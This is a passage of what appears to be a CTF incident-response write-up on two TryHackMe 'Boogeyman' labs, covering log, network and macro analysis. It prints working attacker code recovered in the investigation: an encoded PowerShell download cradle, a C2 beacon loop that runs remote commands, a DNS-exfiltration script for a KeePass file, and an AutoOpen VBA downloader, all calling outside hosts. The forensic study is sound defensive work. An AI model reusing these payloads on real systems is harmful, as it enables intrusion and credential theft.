              File attribute flags: 0
              Primary name: powershell.exe
     DATA
        Description: Invoice Jan 2023
        Relative path: ..<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe
        Working directory: C:
        Command line arguments: <span class="nt">-nop</span> <span class="nt">-windowstyle</span> hidden <span class="nt">-enc</span> <span class="nv">aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA</span><span class="o">==</span>
        Icon location: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\e</span>xcel.ico
     EXTRA BLOCKS:
        ICON_LOCATION_BLOCK
           Target ansi: %USERPROFILE%<span class="se">\D</span>esktop<span class="se">\e</span>xcel.ico
           Target unicode: %USERPROFILE%<span class="se">\D</span>esktop<span class="se">\e</span>xcel.ico
        SPECIAL_FOLDER_LOCATION_BLOCK
           Special folder <span class="nb">id</span>: 37
        KNOWN_FOLDER_LOCATION_BLOCK
           Known folder <span class="nb">id</span>: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
        METADATA_PROPERTIES_BLOCK
           Version: 0x53505331
           Format <span class="nb">id</span>: 46588AE2-4CBC-4338-BBFC-139326986DCE
</pre></td></tr></tbody></table></code></div></div>

<p>The encoded PowerShell command downloads and executes a payload:</p>
<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://files.bpakcaging.xyz/update'</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="log-analysis"><span class="me-2">Log Analysis</span><a href="#log-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="timestamp-fix"><span class="me-2">Timestamp Fix</span><a href="#timestamp-fix" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Sorting JSON logs by timestamp:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>powershell.json | jq <span class="nt">-s</span> <span class="nt">-c</span> <span class="s1">'sort_by(.Timestamp) | .[]'</span> <span class="o">&gt;</span> powershell1.json
</pre></td></tr></tbody></table></code></div></div>

<h4 id="powershell-logs"><span class="me-2">PowerShell Logs</span><a href="#powershell-logs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Analyzing executions:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>powershell1.json | <span class="nb">grep </span>4104 | jq <span class="s1">'.ScriptBlockText'</span> | <span class="nb">grep</span> <span class="nt">-v</span> Set-StrictMode
</pre></td></tr></tbody></table></code></div></div>

<h5 id="initial-execution"><span class="me-2">Initial Execution</span><a href="#initial-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<p>Downloading <code class="language-plaintext highlighter-rouge">update</code>:</p>
<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://files.bpakcaging.xyz/update'</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h5 id="establishing-c2-connection"><span class="me-2">Establishing C2 Connection</span><a href="#establishing-c2-connection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$s</span><span class="o">=</span><span class="s1">'cdn.bpakcaging.xyz:8080'</span><span class="p">;</span><span class="nv">$i</span><span class="o">=</span><span class="s1">'8cce49b0-b86459bb-27fe2489'</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span><span class="s1">'http://'</span><span class="p">;</span><span class="nv">$v</span><span class="o">=</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/8cce49b0</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="s2">"X-38d2-8f49"</span><span class="o">=</span><span class="nv">$i</span><span class="p">};</span><span class="kr">while</span><span class="w"> </span><span class="p">(</span><span class="bp">$true</span><span class="p">){</span><span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/b86459bb</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="s2">"X-38d2-8f49"</span><span class="o">=</span><span class="nv">$i</span><span class="p">})</span><span class="o">.</span><span class="nf">Content</span><span class="p">;</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$c</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s1">'None'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$r</span><span class="o">=</span><span class="n">iex</span><span class="w"> </span><span class="nv">$c</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w"> </span><span class="nt">-ErrorVariable</span><span class="w"> </span><span class="nx">e</span><span class="p">;</span><span class="nv">$r</span><span class="o">=</span><span class="n">Out-String</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$r</span><span class="p">;</span><span class="nv">$t</span><span class="o">=</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/27fe2489</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="s2">"X-38d2-8f49"</span><span class="o">=</span><span class="nv">$i</span><span class="p">}</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$e</span><span class="o">+</span><span class="nv">$r</span><span class="p">)</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">' '</span><span class="p">)}</span><span class="w"> </span><span class="n">sleep</span><span class="w"> </span><span class="nx">0.8</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h5 id="seatbelt-execution"><span class="me-2">Seatbelt Execution</span><a href="#seatbelt-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<p>Locating sensitive files:</p>
<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">cd</span><span class="w"> </span><span class="nx">Users</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">cd</span><span class="w"> </span><span class="nx">j.westcott</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">ps</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'</span><span class="p">);</span><span class="nx">pwd</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">Public</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">cd</span><span class="w"> </span><span class="nx">Music</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">iwr</span><span class="w"> </span><span class="nx">http://files.bpakcaging.xyz/sb.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">sb.exe</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="o">.</span><span class="nx">\\sb.exe</span><span class="w"> </span><span class="nx">all</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="o">.</span><span class="nx">\\sb.exe</span><span class="w"> </span><span class="nx">system</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="o">.</span><span class="nx">\\sb.exe</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="o">.</span><span class="nx">\\sb.exe</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">all</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">Seatbelt.exe</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">user</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="o">.</span><span class="nx">\\sb.exe</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">user</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span><span class="nx">ls</span><span class="w"> </span><span class="nx">C:\\Users\\j.westcott\\Documents\\protected_data.kdbx</span><span class="p">;</span><span class="n">pwd</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h5 id="keepass-database-exfiltration"><span class="me-2">KeePass Database Exfiltration</span><a href="#keepass-database-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<p>Exfiltrating via DNS:</p>
<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="nv">$file</span><span class="o">=</span><span class="s1">'protected_data.kdbx'</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$destination</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"167.71.211.113"</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span><span class="w">
</span><span class="n">split-path</span><span class="w"> </span><span class="nv">$pwd</span><span class="s1">'\\0x00'</span><span class="p">;</span><span class="w">
</span><span class="nv">$file</span><span class="o">=</span><span class="s1">'C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$destination</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"167.71.211.113"</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span><span class="w">
</span><span class="nv">$hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$bytes</span><span class="o">|</span><span class="n">ForEach-Object</span><span class="w"> </span><span class="nx">ToString</span><span class="w"> </span><span class="nx">X2</span><span class="p">)</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">''</span><span class="p">;</span><span class="w">
</span><span class="nv">$split</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$hex</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s1">'(\\S{50})'</span><span class="p">;</span><span class="w"> 
</span><span class="kr">ForEach</span><span class="w"> </span><span class="p">(</span><span class="nv">$line</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$split</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> 
    </span><span class="n">nslookup</span><span class="w"> </span><span class="nt">-q</span><span class="o">=</span><span class="n">A</span><span class="w"> </span><span class="s2">"</span><span class="nv">$line</span><span class="s2">.bpakcaging.xyz"</span><span class="w"> </span><span class="nv">$destination</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w"> 
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"Done"</span><span class="p">;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="network-analysis"><span class="me-2">Network Analysis</span><a href="#network-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="http-traffic"><span class="me-2">HTTP Traffic</span><a href="#http-traffic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Identifying servers:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>tshark <span class="nt">-r</span> capture.pcapng <span class="nt">-Y</span> <span class="s1">'http.response_for.uri contains "bpakcaging.xyz" and http'</span> <span class="nt">-T</span> json | jq <span class="nt">-r</span> <span class="s1">'.[]."_source".layers.http | with_entries(if (.key|test("http.(server)")) then ({key: "server", value: .value}) else empty end) | .server'</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">sort</span> <span class="nt">-nr</span>
    929 Apache/2.4.1 
      3 SimpleHTTP/0.6 Python/3.10.7
</pre></td></tr></tbody></table></code></div></div>

<h4 id="command-executions"><span class="me-2">Command Executions</span><a href="#command-executions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Decoding POST data:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>tshark <span class="nt">-r</span> capture.pcapng <span class="nt">-Y</span> <span class="s1">'http.request.full_uri contains "/27fe2489" and http'</span> <span class="nt">-T</span> json| jq <span class="nt">-r</span> <span class="s1">'.[]."_source".layers.http | with_entries(if (.key|test("http.file_data")) then ({key: "data", value: .value}) else empty end) | .data'</span> | <span class="nb">head</span> <span class="nt">-n1</span>
  13 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 87 105 110 100 111 119 115 92 115 121 115 116 101 109 51 50 13 10 13 10 13 10
</pre></td></tr></tbody></table></code></div></div>

<p>Converting to ASCII:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>c2.data<span class="si">)</span><span class="p">;</span> <span class="k">do for </span>x <span class="k">in</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">do </span><span class="nv">hex</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'%x'</span> <span class="nv">$x</span><span class="si">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="nv">$hex</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span>
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="dns-exfiltration"><span class="me-2">DNS Exfiltration</span><a href="#dns-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Reconstructing the KeePass database:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>tshark <span class="nt">-r</span> capture.pcapng <span class="nt">-Y</span> <span class="s2">"ip.dst==167.71.211.113 and dns"</span> <span class="nt">-T</span> fields <span class="nt">-e</span> dns.qry.name | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'[A-F0-9]+.bpakcaging.xyz$'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'.'</span> <span class="nt">-f1</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'
'</span> | xxd <span class="nt">-p</span> <span class="nt">-r</span> <span class="o">&gt;</span> protected_data.kdbx
<span class="nv">$ </span>file protected_data.kdbx 
  protected_data.kdbx: Keepass password database 2.x KDBX
</pre></td></tr></tbody></table></code></div></div>

<p>Opening the KeePass database:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>kpcli <span class="nt">--kdb</span><span class="o">=</span>protected_data.kdbx 
Provide the master password: <span class="k">*************************</span>
kpcli:/&gt; <span class="nb">dir</span>
  <span class="o">===</span> Groups <span class="o">===</span>
  protected_data/
kpcli:/&gt; <span class="nb">cd </span>protected_data
kpcli:/protected_data&gt; <span class="nb">dir</span>
  <span class="o">===</span> Groups <span class="o">===</span>
  eMail/
  General/
  Homebanking/
  Internet/
  Network/
  Recycle Bin/
  Windows/
kpcli:/protected_data&gt; <span class="nb">cd </span>Homebanking
kpcli:/protected_data/Homebanking&gt; <span class="nb">dir</span>
  <span class="o">===</span> Entries <span class="o">===</span>
  0. Company Card                                                           
kpcli:/protected_data/Homebanking&gt; show 0
  Title: Company Card
  Uname: 
   Pass: 
    URL: 
  Notes: 
  String Values: 
           1<span class="o">)</span> Account Number <span class="o">=</span> 4024007128269551
           2<span class="o">)</span> CVV <span class="o">=</span> 970
           3<span class="o">)</span> Expiration Date <span class="o">=</span> 3/2028
           4<span class="o">)</span> Name <span class="o">=</span> Quick Logistics LLC
</pre></td></tr></tbody></table></code></div></div>

<h2 id="boogeyman-2"><span class="me-2">Boogeyman 2</span><a href="#boogeyman-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<h3 id="background-1"><span class="me-2">Background</span><a href="#background-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Maxine, a Human Resource Specialist working for Quick Logistics LLC, received an application from one of the open positions in the company. Unbeknownst to her, the attached resume was malicious and compromised her workstation.</p>

<hr />

<h3 id="exfiltration-1"><span class="me-2">Exfiltration</span><a href="#exfiltration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="setting-up-python-http-server"><span class="me-2">Setting Up Python HTTP Server</span><a href="#setting-up-python-http-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>To exfiltrate artifacts:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd </span>Desktop/Artefacts/
<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
</pre></td></tr></tbody></table></code></div></div>

<h4 id="downloading-artifacts"><span class="me-2">Downloading Artifacts</span><a href="#downloading-artifacts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>From the host machine:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wget http://&lt;THM_IP&gt;:8000/&lt;filename&gt;
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="email-analysis-1"><span class="me-2">Email Analysis</span><a href="#email-analysis-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="email-header"><span class="me-2">Email Header</span><a href="#email-header" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The email was sent by Wesley Taylor (<code class="language-plaintext highlighter-rouge">westaylor23@outlook.com</code>) to Maxine Beck (<code class="language-plaintext highlighter-rouge">maxine.beck@quicklogisticsorg.onmicrosoft.com</code>):</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>From: "westaylor23@outlook.com" &lt;westaylor23@outlook.com&gt;
To: "maxine.beck@quicklogisticsorg.onmicrosoft.com"
Content-Type: application/msword; name="Resume_WesleyTaylor.doc"
</pre></td></tr></tbody></table></code></div></div>

<h4 id="email-attachment-1"><span class="me-2">Email Attachment</span><a href="#email-attachment-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>A <code class="language-plaintext highlighter-rouge">.doc</code> file was attached to the email. Extracting its contents:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>Resume<span class="se">\ </span>-<span class="se">\ </span>Application<span class="se">\ </span><span class="k">for</span><span class="se">\ </span>Junior<span class="se">\ </span>IT<span class="se">\ </span>Analyst<span class="se">\ </span>Role.eml | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-E</span> <span class="s1">'^[A-Z0-9+/=]{32,76}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\r'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> Resume_WesleyTaylor.doc
<span class="nv">$ </span>file Resume_WesleyTaylor.doc
  Resume_WesleyTaylor.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252
</pre></td></tr></tbody></table></code></div></div>

<h4 id="analyzing-the-malicious-macro"><span class="me-2">Analyzing the Malicious Macro</span><a href="#analyzing-the-malicious-macro" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Using <code class="language-plaintext highlighter-rouge">oledump.py</code> to analyze macros:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 ./git/DidierStevensSuite/oledump.py ./CTF/THM/Boogeyman2/Resume_WesleyTaylor.doc
    1:       114 <span class="s1">'\x01CompObj'</span>
    2:      4096 <span class="s1">'\x05DocumentSummaryInformation'</span>
    3:      4096 <span class="s1">'\x05SummaryInformation'</span>
    4:      7288 <span class="s1">'1Table'</span>
    5:     28574 <span class="s1">'Data'</span>
    6:       414 <span class="s1">'Macros/PROJECT'</span>
    7:        71 <span class="s1">'Macros/PROJECTwm'</span>
    8: M    2027 <span class="s1">'Macros/VBA/NewMacros'</span>
    9: m     962 <span class="s1">'Macros/VBA/ThisDocument'</span>
   10:      2787 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
   11:      2242 <span class="s1">'Macros/VBA/__SRP_0'</span>
   12:       122 <span class="s1">'Macros/VBA/__SRP_1'</span>
   13:       935 <span class="s1">'Macros/VBA/__SRP_2'</span>
   14:       156 <span class="s1">'Macros/VBA/__SRP_3'</span>
   15:       570 <span class="s1">'Macros/VBA/dir'</span>
   16:      4096 <span class="s1">'WordDocument'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The macro downloads a file (<code class="language-plaintext highlighter-rouge">update.png</code>) and saves it as <code class="language-plaintext highlighter-rouge">update.js</code>, then executes it via <code class="language-plaintext highlighter-rouge">wscript.exe</code>:</p>
<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="n">Attribute</span> <span class="n">VB_Name</span> <span class="o">=</span> <span class="s">"NewMacros"</span>
<span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
<span class="n">spath</span> <span class="o">=</span> <span class="s">"C:\ProgramData\"</span>
<span class="k">Dim</span> <span class="nv">xHttp</span><span class="p">:</span> <span class="k">Set</span> <span class="n">xHttp</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Microsoft.XMLHTTP"</span><span class="p">)</span>
<span class="k">Dim</span> <span class="nv">bStrm</span><span class="p">:</span> <span class="k">Set</span> <span class="n">bStrm</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Adodb.Stream"</span><span class="p">)</span>
<span class="n">xHttp</span><span class="p">.</span><span class="n">Open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="s">"https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png"</span><span class="p">,</span> <span class="k">False</span>
<span class="n">xHttp</span><span class="p">.</span><span class="n">Send</span>
<span class="k">With</span> <span class="n">bStrm</span>
    <span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="p">.</span><span class="n">Open</span>
    <span class="p">.</span><span class="n">write</span> <span class="n">xHttp</span><span class="p">.</span><span class="n">responseBody</span>
    <span class="p">.</span><span class="n">savetofile</span> <span class="n">spath</span> <span class="o">&amp;</span> <span class="s">"\update.js"</span><span class="p">,</span> <span class="mi">2</span>
<span class="k">End</span> <span class="k">With</span>
